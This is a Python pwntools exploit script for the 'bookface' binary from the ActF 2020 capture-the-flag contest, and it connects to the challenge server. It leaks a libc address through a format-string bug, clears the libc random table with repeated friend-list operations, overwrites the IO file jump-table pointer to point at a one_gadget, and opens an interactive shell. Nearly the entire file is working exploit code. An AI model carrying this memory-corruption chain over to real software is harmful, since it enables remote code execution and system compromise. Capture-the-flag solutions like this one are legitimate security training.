from pwn import *
import random

#r = process("./bookface", env = {"LD_PRELOAD":"./libc.so.6"})
r = remote("pwn.2020.chall.actf.co", 20733)

def login(id, name, survey, survey2):
    r.sendlineafter("ID: ", str(id))
    if "Before" in r.recvline():
        r.sendafter("Content: ", survey[0:3])
        r.sendafter("Moderation: ", survey[3:6])
        r.sendafter("Interface: ", survey[6:9])
        r.sendafter("Support: ", survey[9:12])
        if survey != "10\n10\n10\n10\n":
            r.sendafter("Content: ", survey2[0:3])
            r.sendafter("Moderation: ", survey2[3:6])
            r.sendafter("Interface: ", survey2[6:9])
            r.sendafter("Support: ", survey2[9:12])
    else:
        r.sendlineafter("name? ", name)
 
def logout():
    r.sendlineafter("> ", "4")

def remove():
    r.sendlineafter("> ", "3")

def add_friend(num):
    r.sendlineafter("> ", "1")
    r.sendlineafter("make? ", str(num))
    
def set_zero(addr):
    login(1, p64(one_gadget)*32, "10\n10\n10\n10\n", "10\n10\n10\n10\n")
    add_friend(addr / 8)
    logout()
    login(1, p64(one_gadget)*32, "01\n01\n01\n01\n", "01\n01\n01\n01\n")
    remove()
    
login(0, "a", "10\n10\n10\n10\n", "10\n10\n10\n10\n")
logout()
r.sendlineafter("ID: ", "0")
r.sendafter("Content: ", "%3$lx aaaaa\n")
r.recvuntil("again:\n")
libc_base = int(r.recv(12), 16) - 1012416
log.info("libc_base: " + hex(libc_base))
one_gadget = libc_base + 0x4526a
IO_file_jmp = libc_base + 3954424
rand_type = libc_base + 3950136
rand_state = libc_base + 3948708
rand_tbl = libc_base + 3948704
r.sendafter("Content: ", "10\n10\n10\n10\n")
logout()

login(1, p64(one_gadget)*32, "10\n10\n10\n10\n", "10\n10\n10\n10\n")
remove()
'''
for i in range(100):
    print i
    login(random.randint(1, 1000000), p64(one_gadget)*32, "10\n10\n10\n10\n", "10\n10\n10\n10\n")
    logout()
'''
for j in range(4):
    print j
    for i in range(9):
        print str(j) + ":" + str(i)
        set_zero(rand_tbl + 8*i)
'''
for i in range(5000):
    print i
    login(random.randint(1, 1000000), p64(one_gadget)*32, "10\n10\n10\n10\n", "10\n10\n10\n10\n")
    logout()
'''    
login(1, p64(one_gadget)*32, "10\n10\n10\n10\n", "10\n10\n10\n10\n")
add_friend(IO_file_jmp / 8)
logout()

login(1, p64(one_gadget)*32, "01\n01\n01\n01\n", "01\n01\n01\n01\n")

r.interactive()

